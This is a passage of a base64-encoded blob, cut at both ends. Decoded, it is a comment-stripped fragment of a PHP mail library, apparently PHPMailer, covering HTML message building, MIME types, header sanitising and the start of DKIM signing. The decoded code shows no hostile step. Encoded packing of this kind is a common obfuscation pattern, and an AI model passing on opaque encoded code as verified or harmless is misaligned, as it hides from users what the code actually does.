KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5sYW5ndWFnZVska2V5XTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIHJldHVybiAka2V5Ow0KICAgICAgICB9DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBpc0Vycm9yKCkgew0KICAgICAgICByZXR1cm4gKCR0aGlzLT5lcnJvcl9jb3VudCA+IDApOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZml4RU9MKCRzdHIpIHsNCiAgICAgICAgJG5zdHIgPSBzdHJfcmVwbGFjZShhcnJheSgNCiAgICAgICAgICAgICJcclxuIiwNCiAgICAgICAgICAgICJcciINCiAgICAgICAgKSwgIlxuIiwgJHN0cik7DQogICAgICAgIGlmICgkdGhpcy0+TEUgIT09ICJcbiIpIHsNCiAgICAgICAgICAgICRuc3RyID0gc3RyX3JlcGxhY2UoIlxuIiwgJHRoaXMtPkxFLCAkbnN0cik7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRuc3RyOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkQ3VzdG9tSGVhZGVyKCRuYW1lLCAkdmFsdWUgPSBudWxsKSB7DQogICAgICAgIGlmICgkdmFsdWUgPT09IG51bGwpIHsNCiAgICAgICAgICAgICR0aGlzLT5DdXN0b21IZWFkZXJbXSA9IGV4cGxvZGUoJzonLCAkbmFtZSwgMik7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkdGhpcy0+Q3VzdG9tSGVhZGVyW10gPSBhcnJheSgNCiAgICAgICAgICAgICAgICAkbmFtZSwNCiAgICAgICAgICAgICAgICAkdmFsdWUNCiAgICAgICAgICAgICk7DQogICAgICAgIH0NCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGdldEN1c3RvbUhlYWRlcnMoKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+Q3VzdG9tSGVhZGVyOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gbXNnSFRNTCgkbWVzc2FnZSwgJGJhc2VkaXIgPSAnJywgJGFkdmFuY2VkID0gZmFsc2UpIHsNCiAgICAgICAgcHJlZ19tYXRjaF9hbGwoJy8oc3JjfGJhY2tncm91bmQpPVsiXCddKC4qKVsiXCddL1VpJywgJG1lc3NhZ2UsICRpbWFnZXMpOw0KICAgICAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cygyLCAkaW1hZ2VzKSkgew0KICAgICAgICAgICAgaWYgKHN0cmxlbigkYmFzZWRpcikgPiAxICYmIHN1YnN0cigkYmFzZWRpciwgLTEpICE9ICcvJykgew0KICAgICAgICAgICAgICAgICRiYXNlZGlyIC49ICcvJzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGZvcmVhY2ggKCRpbWFnZXNbMl0gYXMgJGltZ2luZGV4ID0+ICR1cmwpIHsNCiAgICAgICAgICAgICAgICBpZiAocHJlZ19tYXRjaCgnI15kYXRhOihpbWFnZVteOyxdKikoO2Jhc2U2NCk/LCMnLCAkdXJsLCAkbWF0Y2gpKSB7DQogICAgICAgICAgICAgICAgICAgICRkYXRhID0gc3Vic3RyKCR1cmwsIHN0cnBvcygkdXJsLCAnLCcpKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCRtYXRjaFsyXSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJGRhdGEgPSBiYXNlNjRfZGVjb2RlKCRkYXRhKTsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRkYXRhID0gcmF3dXJsZGVjb2RlKCRkYXRhKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAkY2lkID0gbWQ1KCR1cmwpIC4gJ0BwaHBtYWlsZXIuMCc7DQogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+YWRkU3RyaW5nRW1iZWRkZWRJbWFnZSgkZGF0YSwgJGNpZCwgJ2VtYmVkJyAuICRpbWdpbmRleCwgJ2Jhc2U2NCcsICRtYXRjaFsxXSkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlID0gc3RyX3JlcGxhY2UoJGltYWdlc1swXVskaW1naW5kZXhdLCAkaW1hZ2VzWzFdWyRpbWdpbmRleF0gLiAnPSJjaWQ6JyAuICRjaWQgLiAnIicsICRtZXNzYWdlKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkYmFzZWRpcikgJiYgKHN0cnBvcygkdXJsLCAnLi4nKSA9PT0gZmFsc2UpICYmIHN1YnN0cigkdXJsLCAwLCA0KSAhPT0gJ2NpZDonICYmICFwcmVnX21hdGNoKCcjXlthLXpdW2EtejAtOSsuLV0qOj8vLyNpJywgJHVybCkpIHsNCiAgICAgICAgICAgICAgICAgICAgJGZpbGVuYW1lICA9IGJhc2VuYW1lKCR1cmwpOw0KICAgICAgICAgICAgICAgICAgICAkZGlyZWN0b3J5ID0gZGlybmFtZSgkdXJsKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCRkaXJlY3RvcnkgPT0gJy4nKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkZGlyZWN0b3J5ID0gJyc7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgJGNpZCA9IG1kNSgkdXJsKSAuICdAcGhwbWFpbGVyLjAnOw0KICAgICAgICAgICAgICAgICAgICBpZiAoc3RybGVuKCRkaXJlY3RvcnkpID4gMSAmJiBzdWJzdHIoJGRpcmVjdG9yeSwgLTEpICE9ICcvJykgew0KICAgICAgICAgICAgICAgICAgICAgICAgJGRpcmVjdG9yeSAuPSAnLyc7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5hZGRFbWJlZGRlZEltYWdlKCRiYXNlZGlyIC4gJGRpcmVjdG9yeSAuICRmaWxlbmFtZSwgJGNpZCwgJGZpbGVuYW1lLCAnYmFzZTY0Jywgc2VsZjo6X21pbWVfdHlwZXMoKHN0cmluZykgc2VsZjo6bWJfcGF0aGluZm8oJGZpbGVuYW1lLCBQQVRISU5GT19FWFRFTlNJT04pKSkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlID0gcHJlZ19yZXBsYWNlKCcvJyAuICRpbWFnZXNbMV1bJGltZ2luZGV4XSAuICc9WyJcJ10nIC4gcHJlZ19xdW90ZSgkdXJsLCAnLycpIC4gJ1siXCddL1VpJywgJGltYWdlc1sxXVskaW1naW5kZXhdIC4gJz0iY2lkOicgLiAkY2lkIC4gJyInLCAkbWVzc2FnZSk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPmlzSFRNTCh0cnVlKTsNCiAgICAgICAgJHRoaXMtPkJvZHkgICAgPSAkdGhpcy0+bm9ybWFsaXplQnJlYWtzKCRtZXNzYWdlKTsNCiAgICAgICAgJHRoaXMtPkFsdEJvZHkgPSAkdGhpcy0+bm9ybWFsaXplQnJlYWtzKCR0aGlzLT5odG1sMnRleHQoJG1lc3NhZ2UsICRhZHZhbmNlZCkpOw0KICAgICAgICBpZiAoISR0aGlzLT5hbHRlcm5hdGl2ZUV4aXN0cygpKSB7DQogICAgICAgICAgICAkdGhpcy0+QWx0Qm9keSA9ICdUbyB2aWV3IHRoaXMgZW1haWwgbWVzc2FnZSwgb3BlbiBpdCBpbiBhIHByb2dyYW0gdGhhdCB1bmRlcnN0YW5kcyBIVE1MIScgLiBzZWxmOjpDUkxGIC4gc2VsZjo6Q1JMRjsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJHRoaXMtPkJvZHk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBodG1sMnRleHQoJGh0bWwsICRhZHZhbmNlZCA9IGZhbHNlKSB7DQogICAgICAgIGlmIChpc19jYWxsYWJsZSgkYWR2YW5jZWQpKSB7DQogICAgICAgICAgICByZXR1cm4gY2FsbF91c2VyX2Z1bmMoJGFkdmFuY2VkLCAkaHRtbCk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGh0bWxfZW50aXR5X2RlY29kZSh0cmltKHN0cmlwX3RhZ3MocHJlZ19yZXBsYWNlKCcvPChoZWFkfHRpdGxlfHN0eWxlfHNjcmlwdClbXj5dKj4uKj88XC9cXDE+L3NpJywgJycsICRodG1sKSkpLCBFTlRfUVVPVEVTLCAkdGhpcy0+Q2hhclNldCk7DQogICAgfQ0KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gX21pbWVfdHlwZXMoJGV4dCA9ICcnKSB7DQogICAgICAgICRtaW1lcyA9IGFycmF5KA0KICAgICAgICAgICAgJ3hsJyA9PiAnYXBwbGljYXRpb24vZXhjZWwnLA0KICAgICAgICAgICAgJ2pzJyA9PiAnYXBwbGljYXRpb24vamF2YXNjcmlwdCcsDQogICAgICAgICAgICAnaHF4JyA9PiAnYXBwbGljYXRpb24vbWFjLWJpbmhleDQwJywNCiAgICAgICAgICAgICdjcHQnID0+ICdhcHBsaWNhdGlvbi9tYWMtY29tcGFjdHBybycsDQogICAgICAgICAgICAnYmluJyA9PiAnYXBwbGljYXRpb24vbWFjYmluYXJ5JywNCiAgICAgICAgICAgICdkb2MnID0+ICdhcHBsaWNhdGlvbi9tc3dvcmQnLA0KICAgICAgICAgICAgJ3dvcmQnID0+ICdhcHBsaWNhdGlvbi9tc3dvcmQnLA0KICAgICAgICAgICAgJ3hsc3gnID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQuc3ByZWFkc2hlZXRtbC5zaGVldCcsDQogICAgICAgICAgICAneGx0eCcgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5zcHJlYWRzaGVldG1sLnRlbXBsYXRlJywNCiAgICAgICAgICAgICdwb3R4JyA9PiAnYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LnByZXNlbnRhdGlvbm1sLnRlbXBsYXRlJywNCiAgICAgICAgICAgICdwcHN4JyA9PiAnYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LnByZXNlbnRhdGlvbm1sLnNsaWRlc2hvdycsDQogICAgICAgICAgICAncHB0eCcgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5wcmVzZW50YXRpb25tbC5wcmVzZW50YXRpb24nLA0KICAgICAgICAgICAgJ3NsZHgnID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQucHJlc2VudGF0aW9ubWwuc2xpZGUnLA0KICAgICAgICAgICAgJ2RvY3gnID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQud29yZHByb2Nlc3NpbmdtbC5kb2N1bWVudCcsDQogICAgICAgICAgICAnZG90eCcgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC53b3JkcHJvY2Vzc2luZ21sLnRlbXBsYXRlJywNCiAgICAgICAgICAgICd4bGFtJyA9PiAnYXBwbGljYXRpb24vdm5kLm1zLWV4Y2VsLmFkZGluLm1hY3JvRW5hYmxlZC4xMicsDQogICAgICAgICAgICAneGxzYicgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5tcy1leGNlbC5zaGVldC5iaW5hcnkubWFjcm9FbmFibGVkLjEyJywNCiAgICAgICAgICAgICdjbGFzcycgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsDQogICAgICAgICAgICAnZGxsJyA9PiAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywNCiAgICAgICAgICAgICdkbXMnID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLA0KICAgICAgICAgICAgJ2V4ZScgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsDQogICAgICAgICAgICAnbGhhJyA9PiAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywNCiAgICAgICAgICAgICdsemgnID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLA0KICAgICAgICAgICAgJ3BzZCcgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsDQogICAgICAgICAgICAnc2VhJyA9PiAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywNCiAgICAgICAgICAgICdzbycgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsDQogICAgICAgICAgICAnb2RhJyA9PiAnYXBwbGljYXRpb24vb2RhJywNCiAgICAgICAgICAgICdwZGYnID0+ICdhcHBsaWNhdGlvbi9wZGYnLA0KICAgICAgICAgICAgJ2FpJyA9PiAnYXBwbGljYXRpb24vcG9zdHNjcmlwdCcsDQogICAgICAgICAgICAnZXBzJyA9PiAnYXBwbGljYXRpb24vcG9zdHNjcmlwdCcsDQogICAgICAgICAgICAncHMnID0+ICdhcHBsaWNhdGlvbi9wb3N0c2NyaXB0JywNCiAgICAgICAgICAgICdzbWknID0+ICdhcHBsaWNhdGlvbi9zbWlsJywNCiAgICAgICAgICAgICdzbWlsJyA9PiAnYXBwbGljYXRpb24vc21pbCcsDQogICAgICAgICAgICAnbWlmJyA9PiAnYXBwbGljYXRpb24vdm5kLm1pZicsDQogICAgICAgICAgICAneGxzJyA9PiAnYXBwbGljYXRpb24vdm5kLm1zLWV4Y2VsJywNCiAgICAgICAgICAgICdwcHQnID0+ICdhcHBsaWNhdGlvbi92bmQubXMtcG93ZXJwb2ludCcsDQogICAgICAgICAgICAnd2J4bWwnID0+ICdhcHBsaWNhdGlvbi92bmQud2FwLndieG1sJywNCiAgICAgICAgICAgICd3bWxjJyA9PiAnYXBwbGljYXRpb24vdm5kLndhcC53bWxjJywNCiAgICAgICAgICAgICdkY3InID0+ICdhcHBsaWNhdGlvbi94LWRpcmVjdG9yJywNCiAgICAgICAgICAgICdkaXInID0+ICdhcHBsaWNhdGlvbi94LWRpcmVjdG9yJywNCiAgICAgICAgICAgICdkeHInID0+ICdhcHBsaWNhdGlvbi94LWRpcmVjdG9yJywNCiAgICAgICAgICAgICdkdmknID0+ICdhcHBsaWNhdGlvbi94LWR2aScsDQogICAgICAgICAgICAnZ3RhcicgPT4gJ2FwcGxpY2F0aW9uL3gtZ3RhcicsDQogICAgICAgICAgICAncGhwMycgPT4gJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwJywNCiAgICAgICAgICAgICdwaHA0JyA9PiAnYXBwbGljYXRpb24veC1odHRwZC1waHAnLA0KICAgICAgICAgICAgJ3BocCcgPT4gJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwJywNCiAgICAgICAgICAgICdwaHRtbCcgPT4gJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwJywNCiAgICAgICAgICAgICdwaHBzJyA9PiAnYXBwbGljYXRpb24veC1odHRwZC1waHAtc291cmNlJywNCiAgICAgICAgICAgICdzd2YnID0+ICdhcHBsaWNhdGlvbi94LXNob2Nrd2F2ZS1mbGFzaCcsDQogICAgICAgICAgICAnc2l0JyA9PiAnYXBwbGljYXRpb24veC1zdHVmZml0JywNCiAgICAgICAgICAgICd0YXInID0+ICdhcHBsaWNhdGlvbi94LXRhcicsDQogICAgICAgICAgICAndGd6JyA9PiAnYXBwbGljYXRpb24veC10YXInLA0KICAgICAgICAgICAgJ3hodCcgPT4gJ2FwcGxpY2F0aW9uL3hodG1sK3htbCcsDQogICAgICAgICAgICAneGh0bWwnID0+ICdhcHBsaWNhdGlvbi94aHRtbCt4bWwnLA0KICAgICAgICAgICAgJ3ppcCcgPT4gJ2FwcGxpY2F0aW9uL3ppcCcsDQogICAgICAgICAgICAnbWlkJyA9PiAnYXVkaW8vbWlkaScsDQogICAgICAgICAgICAnbWlkaScgPT4gJ2F1ZGlvL21pZGknLA0KICAgICAgICAgICAgJ21wMicgPT4gJ2F1ZGlvL21wZWcnLA0KICAgICAgICAgICAgJ21wMycgPT4gJ2F1ZGlvL21wZWcnLA0KICAgICAgICAgICAgJ21wZ2EnID0+ICdhdWRpby9tcGVnJywNCiAgICAgICAgICAgICdhaWYnID0+ICdhdWRpby94LWFpZmYnLA0KICAgICAgICAgICAgJ2FpZmMnID0+ICdhdWRpby94LWFpZmYnLA0KICAgICAgICAgICAgJ2FpZmYnID0+ICdhdWRpby94LWFpZmYnLA0KICAgICAgICAgICAgJ3JhbScgPT4gJ2F1ZGlvL3gtcG4tcmVhbGF1ZGlvJywNCiAgICAgICAgICAgICdybScgPT4gJ2F1ZGlvL3gtcG4tcmVhbGF1ZGlvJywNCiAgICAgICAgICAgICdycG0nID0+ICdhdWRpby94LXBuLXJlYWxhdWRpby1wbHVnaW4nLA0KICAgICAgICAgICAgJ3JhJyA9PiAnYXVkaW8veC1yZWFsYXVkaW8nLA0KICAgICAgICAgICAgJ3dhdicgPT4gJ2F1ZGlvL3gtd2F2JywNCiAgICAgICAgICAgICdibXAnID0+ICdpbWFnZS9ibXAnLA0KICAgICAgICAgICAgJ2dpZicgPT4gJ2ltYWdlL2dpZicsDQogICAgICAgICAgICAnanBlZycgPT4gJ2ltYWdlL2pwZWcnLA0KICAgICAgICAgICAgJ2pwZScgPT4gJ2ltYWdlL2pwZWcnLA0KICAgICAgICAgICAgJ2pwZycgPT4gJ2ltYWdlL2pwZWcnLA0KICAgICAgICAgICAgJ3BuZycgPT4gJ2ltYWdlL3BuZycsDQogICAgICAgICAgICAndGlmZicgPT4gJ2ltYWdlL3RpZmYnLA0KICAgICAgICAgICAgJ3RpZicgPT4gJ2ltYWdlL3RpZmYnLA0KICAgICAgICAgICAgJ2VtbCcgPT4gJ21lc3NhZ2UvcmZjODIyJywNCiAgICAgICAgICAgICdjc3MnID0+ICd0ZXh0L2NzcycsDQogICAgICAgICAgICAnaHRtbCcgPT4gJ3RleHQvaHRtbCcsDQogICAgICAgICAgICAnaHRtJyA9PiAndGV4dC9odG1sJywNCiAgICAgICAgICAgICdzaHRtbCcgPT4gJ3RleHQvaHRtbCcsDQogICAgICAgICAgICAnbG9nJyA9PiAndGV4dC9wbGFpbicsDQogICAgICAgICAgICAndGV4dCcgPT4gJ3RleHQvcGxhaW4nLA0KICAgICAgICAgICAgJ3R4dCcgPT4gJ3RleHQvcGxhaW4nLA0KICAgICAgICAgICAgJ3J0eCcgPT4gJ3RleHQvcmljaHRleHQnLA0KICAgICAgICAgICAgJ3J0ZicgPT4gJ3RleHQvcnRmJywNCiAgICAgICAgICAgICd2Y2YnID0+ICd0ZXh0L3ZjYXJkJywNCiAgICAgICAgICAgICd2Y2FyZCcgPT4gJ3RleHQvdmNhcmQnLA0KICAgICAgICAgICAgJ3htbCcgPT4gJ3RleHQveG1sJywNCiAgICAgICAgICAgICd4c2wnID0+ICd0ZXh0L3htbCcsDQogICAgICAgICAgICAnbXBlZycgPT4gJ3ZpZGVvL21wZWcnLA0KICAgICAgICAgICAgJ21wZScgPT4gJ3ZpZGVvL21wZWcnLA0KICAgICAgICAgICAgJ21wZycgPT4gJ3ZpZGVvL21wZWcnLA0KICAgICAgICAgICAgJ21vdicgPT4gJ3ZpZGVvL3F1aWNrdGltZScsDQogICAgICAgICAgICAncXQnID0+ICd2aWRlby9xdWlja3RpbWUnLA0KICAgICAgICAgICAgJ3J2JyA9PiAndmlkZW8vdm5kLnJuLXJlYWx2aWRlbycsDQogICAgICAgICAgICAnYXZpJyA9PiAndmlkZW8veC1tc3ZpZGVvJywNCiAgICAgICAgICAgICdtb3ZpZScgPT4gJ3ZpZGVvL3gtc2dpLW1vdmllJw0KICAgICAgICApOw0KICAgICAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cyhzdHJ0b2xvd2VyKCRleHQpLCAkbWltZXMpKSB7DQogICAgICAgICAgICByZXR1cm4gJG1pbWVzW3N0cnRvbG93ZXIoJGV4dCldOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJzsNCiAgICB9DQogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBmaWxlbmFtZVRvVHlwZSgkZmlsZW5hbWUpIHsNCiAgICAgICAgJHFwb3MgPSBzdHJwb3MoJGZpbGVuYW1lLCAnPycpOw0KICAgICAgICBpZiAoZmFsc2UgIT09ICRxcG9zKSB7DQogICAgICAgICAgICAkZmlsZW5hbWUgPSBzdWJzdHIoJGZpbGVuYW1lLCAwLCAkcXBvcyk7DQogICAgICAgIH0NCiAgICAgICAgJHBhdGhpbmZvID0gc2VsZjo6bWJfcGF0aGluZm8oJGZpbGVuYW1lKTsNCiAgICAgICAgcmV0dXJuIHNlbGY6Ol9taW1lX3R5cGVzKCRwYXRoaW5mb1snZXh0ZW5zaW9uJ10pOw0KICAgIH0NCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIG1iX3BhdGhpbmZvKCRwYXRoLCAkb3B0aW9ucyA9IG51bGwpIHsNCiAgICAgICAgJHJldCAgICAgID0gYXJyYXkoDQogICAgICAgICAgICAnZGlybmFtZScgPT4gJycsDQogICAgICAgICAgICAnYmFzZW5hbWUnID0+ICcnLA0KICAgICAgICAgICAgJ2V4dGVuc2lvbicgPT4gJycsDQogICAgICAgICAgICAnZmlsZW5hbWUnID0+ICcnDQogICAgICAgICk7DQogICAgICAgICRwYXRoaW5mbyA9IGFycmF5KCk7DQogICAgICAgIGlmIChwcmVnX21hdGNoKCclXiguKj8pW1xcXFwvXSooKFteL1xcXFxdKj8pKFwuKFteXC5cXFxcL10rPyl8KSlbXFxcXC9cLl0qJCVpbScsICRwYXRoLCAkcGF0aGluZm8pKSB7DQogICAgICAgICAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cygxLCAkcGF0aGluZm8pKSB7DQogICAgICAgICAgICAgICAgJHJldFsnZGlybmFtZSddID0gJHBhdGhpbmZvWzFdOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoMiwgJHBhdGhpbmZvKSkgew0KICAgICAgICAgICAgICAgICRyZXRbJ2Jhc2VuYW1lJ10gPSAkcGF0aGluZm9bMl07DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cyg1LCAkcGF0aGluZm8pKSB7DQogICAgICAgICAgICAgICAgJHJldFsnZXh0ZW5zaW9uJ10gPSAkcGF0aGluZm9bNV07DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cygzLCAkcGF0aGluZm8pKSB7DQogICAgICAgICAgICAgICAgJHJldFsnZmlsZW5hbWUnXSA9ICRwYXRoaW5mb1szXTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBzd2l0Y2ggKCRvcHRpb25zKSB7DQogICAgICAgICAgICBjYXNlIFBBVEhJTkZPX0RJUk5BTUU6DQogICAgICAgICAgICBjYXNlICdkaXJuYW1lJzoNCiAgICAgICAgICAgICAgICByZXR1cm4gJHJldFsnZGlybmFtZSddOw0KICAgICAgICAgICAgY2FzZSBQQVRISU5GT19CQVNFTkFNRToNCiAgICAgICAgICAgIGNhc2UgJ2Jhc2VuYW1lJzoNCiAgICAgICAgICAgICAgICByZXR1cm4gJHJldFsnYmFzZW5hbWUnXTsNCiAgICAgICAgICAgIGNhc2UgUEFUSElORk9fRVhURU5TSU9OOg0KICAgICAgICAgICAgY2FzZSAnZXh0ZW5zaW9uJzoNCiAgICAgICAgICAgICAgICByZXR1cm4gJHJldFsnZXh0ZW5zaW9uJ107DQogICAgICAgICAgICBjYXNlIFBBVEhJTkZPX0ZJTEVOQU1FOg0KICAgICAgICAgICAgY2FzZSAnZmlsZW5hbWUnOg0KICAgICAgICAgICAgICAgIHJldHVybiAkcmV0WydmaWxlbmFtZSddOw0KICAgICAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgICAgICByZXR1cm4gJHJldDsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gc2V0KCRuYW1lLCAkdmFsdWUgPSAnJykgew0KICAgICAgICBpZiAocHJvcGVydHlfZXhpc3RzKCR0aGlzLCAkbmFtZSkpIHsNCiAgICAgICAgICAgICR0aGlzLT4kbmFtZSA9ICR2YWx1ZTsNCiAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCR0aGlzLT5sYW5nKCd2YXJpYWJsZV9zZXQnKSAuICRuYW1lKTsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gc2VjdXJlSGVhZGVyKCRzdHIpIHsNCiAgICAgICAgcmV0dXJuIHRyaW0oc3RyX3JlcGxhY2UoYXJyYXkoDQogICAgICAgICAgICAiXHIiLA0KICAgICAgICAgICAgIlxuIg0KICAgICAgICApLCAnJywgJHN0cikpOw0KICAgIH0NCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIG5vcm1hbGl6ZUJyZWFrcygkdGV4dCwgJGJyZWFrdHlwZSA9ICJcclxuIikgew0KICAgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFxyXG58XHJ8XG4pL21zJywgJGJyZWFrdHlwZSwgJHRleHQpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gc2lnbigkY2VydF9maWxlbmFtZSwgJGtleV9maWxlbmFtZSwgJGtleV9wYXNzLCAkZXh0cmFjZXJ0c19maWxlbmFtZSA9ICcnKSB7DQogICAgICAgICR0aGlzLT5zaWduX2NlcnRfZmlsZSAgICAgICA9ICRjZXJ0X2ZpbGVuYW1lOw0KICAgICAgICAkdGhpcy0+c2lnbl9rZXlfZmlsZSAgICAgICAgPSAka2V5X2ZpbGVuYW1lOw0KICAgICAgICAkdGhpcy0+c2lnbl9rZXlfcGFzcyAgICAgICAgPSAka2V5X3Bhc3M7DQogICAgICAgICR0aGlzLT5zaWduX2V4dHJhY2VydHNfZmlsZSA9ICRleHRyYWNlcnRzX2ZpbGVuYW1lOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gREtJTV9RUCgkdHh0KSB7DQogICAgICAgICRsaW5lID0gJyc7DQogICAgICAgIGZvciAoJGkgPSAwOyAkaSA8IHN0cmxlbigkdHh0KTsgJGkrKykgew0KICAgICAgICAgICAgJG9yZCA9IG9yZCgkdHh0WyRpXSk7DQogICAgICAgICAgICBpZiAoKCgweDIxIDw9ICRvcmQpICYmICgkb3JkIDw9IDB4M0EpKSB8fCAkb3JkID09IDB4M0MgfHwgKCgweDNFIDw9ICRvcmQpICYmICgkb3JkIDw9IDB4N0UpKSkgew0KICAgICAgICAgICAgICAgICRsaW5lIC49ICR0eHRbJGldOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAkbGluZSAuPSAnPScgLiBzcHJpbnRmKCclMDJYJywgJG9yZCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRsaW5lOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gREtJTV9TaWduKCRzaWduSGVhZGVyKSB7DQogICAgICAgIGlmICghZGVmaW5lZCgnUEtDUzdfVEVYVCcpKSB7DQogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdleHRlbnNpb25fbWlzc2luZycpIC4gJ29wZW5zc2wnKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiAnJzsNCiAgICAgICAgfQ0KICAgICAgICAkcHJpdktleVN0ciA9ICFlbXB0eSgkdGhpcy0+REtJTV9wcml2YXRlX3N0cmluZykgPyAkdGhpcy0+REtJTV9wcml2YXRlX3N0cmluZyA6IEBmaWxlX2dldF9jb250ZW50cygkdGhpcy0+REtJTV9wcml2YXRlKTsNCiAgICAgICAgaWYgKCcnICE9ICR0aGlzLT5ES0lNX3Bhc3NwaHJhc2UpIHsNCiAgICAgICAgICAgICRwcml2S2V5ID0gb3BlbnNzbF9wa2V5X2dldF9wcml2YXRlKCRwcml2S2V5U3RyLCAkdGhpcy0+REtJTV9wYXNzcGhyYXNlKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRwcml2S2V5ID0gb3BlbnNzbF9wa2V5X2dldF9wcml2YXRlKCRwcml2S2V5U3RyKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAodmVyc2lvbl9jb21wYXJlKFBIUF9WRVJTSU9OLCAnNS4zLjAnKSA+PSAwIGFuZCBpbl9hcnJheSgnc2hhMjU2V2l0aFJTQUVuY3J5cHRpb24nLCBvcGVuc3NsX2dldF9tZF9tZXRob2RzKHRydWUpKS